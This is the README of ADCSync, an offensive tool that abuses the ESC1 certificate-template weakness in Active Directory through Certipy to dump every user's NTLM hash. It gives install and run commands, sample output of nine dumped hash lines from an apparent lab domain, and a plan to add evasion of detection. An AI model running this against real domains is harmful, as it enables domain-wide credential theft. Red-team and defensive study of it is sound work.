# ADCSsync

This is a tool I whipped up together quickly to DCSync utilizing ESC1. It is quite slow but otherwise an effective means of performing a makeshift DCSync attack without utilizing [DRSUAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) or [Volume Shadow Copy](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#volume-shadow-copy). 

This is the first version of the tool and essentially just automates the process of running Certipy against every user in a domain. It still needs a lot of work and I plan on adding more features in the future for authentication methods and automating the process of finding a vulnerable template.

```
python3 adcsync.py -u clu -p theperfectsystem -ca THEGRID-KFLYNN-DC-CA -template SmartCard -target-ip 192.168.0.98 -dc-ip 192.168.0.98 -f users.json -o ntlm_dump.txt

    ___    ____  ___________
   /   |  / __ \/ ____/ ___/__  ______  _____
  / /| | / / / / /    \__ \/ / / / __ \/ ___/
 / ___ |/ /_/ / /___ ___/ / /_/ / / / / /__
/_/  |_/_____/\____//____/\__, /_/ /_/\___/
                         /____/

Grabbing user certs:
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 105/105 [02:18<00:00,  1.32s/it]
THEGRID.LOCAL/shirlee.saraann::aad3b435b51404eeaad3b435b51404ee:68832255545152d843216ed7bbb2d09e:::
THEGRID.LOCAL/rosanne.nert::aad3b435b51404eeaad3b435b51404ee:a20821df366981f7110c07c7708f7ed2:::
THEGRID.LOCAL/edita.lauree::aad3b435b51404eeaad3b435b51404ee:b212294e06a0757547d66b78bb632d69:::
THEGRID.LOCAL/carol.elianore::aad3b435b51404eeaad3b435b51404ee:ed4603ce5a1c86b977dc049a77d2cc6f:::
THEGRID.LOCAL/astrid.lotte::aad3b435b51404eeaad3b435b51404ee:201789a1986f2a2894f7ac726ea12a0b:::
THEGRID.LOCAL/louise.hedvig::aad3b435b51404eeaad3b435b51404ee:edc599314b95cf5635eb132a1cb5f04d:::
THEGRID.LOCAL/janelle.jess::aad3b435b51404eeaad3b435b51404ee:a7a1d8ae1867bb60d23e0b88342a6fab:::
THEGRID.LOCAL/marie-ann.kayle::aad3b435b51404eeaad3b435b51404ee:a55d86c4b2c2b2ae526a14e7e2cd259f:::
THEGRID.LOCAL/jeanie.isa::aad3b435b51404eeaad3b435b51404ee:61f8c2bf0dc57933a578aa2bc835f2e5:::
```

## Introduction
ADCSync uses the ESC1 exploit to dump NTLM hashes from user accounts in an Active Directory environment. The tool will first grab every user and domain in the Bloodhound dump file passed in. Then it will use Certipy to make a request for each user and store their PFX file in the certificate directory. Finally, it will use Certipy to authenticate with the certificate and retrieve the NT hash for each user. This process is quite slow and can take a while to complete but offers an alternative way to dump NTLM hashes. 


## Installation
```
git clone https://github.com/JPG0mez/adcsync.git
cd adcsync
pip3 install -r requirements.txt
```

## Usage

To use this tool we need the following things:

1. Valid Domain Credentials
2. A user list from a bloodhound dump that will be passed in.
3. A template vulnerable to ESC1 (Found with Certipy find)


```
# python3 adcsync.py --help
    ___    ____  ___________                 
   /   |  / __ \/ ____/ ___/__  ______  _____
  / /| | / / / / /    \__ \/ / / / __ \/ ___/
 / ___ |/ /_/ / /___ ___/ / /_/ / / / / /__  
/_/  |_/_____/\____//____/\__, /_/ /_/\___/  
                         /____/              

Usage: adcsync.py [OPTIONS]

Options:
  -f, --file TEXT      Input User List JSON file from Bloodhound  [required]
  -o, --output TEXT    NTLM Hash Output file  [required]
  -ca TEXT             Certificate Authority  [required]
  -dc-ip TEXT          IP Address of Domain Controller  [required]
  -u, --user TEXT      Username  [required]
  -p, --password TEXT  Password  [required]
  -template TEXT       Template Name vulnerable to ESC1  [required]
  -target-ip TEXT      IP Address of the target machine  [required]
  --help               Show this message and exit.

```

## TODO
* Support alternative authentication methods such as NTLM hashes and ccache files
* Automatically run "certipy find" to find and grab templates vulnerable to ESC1
* Add jitter and sleep options to avoid detection
* Add type validation for all variables


## Acknowledgements
* [puzzlepeaches](https://github.com/puzzlepeaches): Telling me to hurry up and write this
* [ly4k](https://github.com/ly4k/Certipy): For Certipy
* [WazeHell](https://github.com/WazeHell/vulnerable-AD): For the script to set up the vulnerable AD environment used for testing
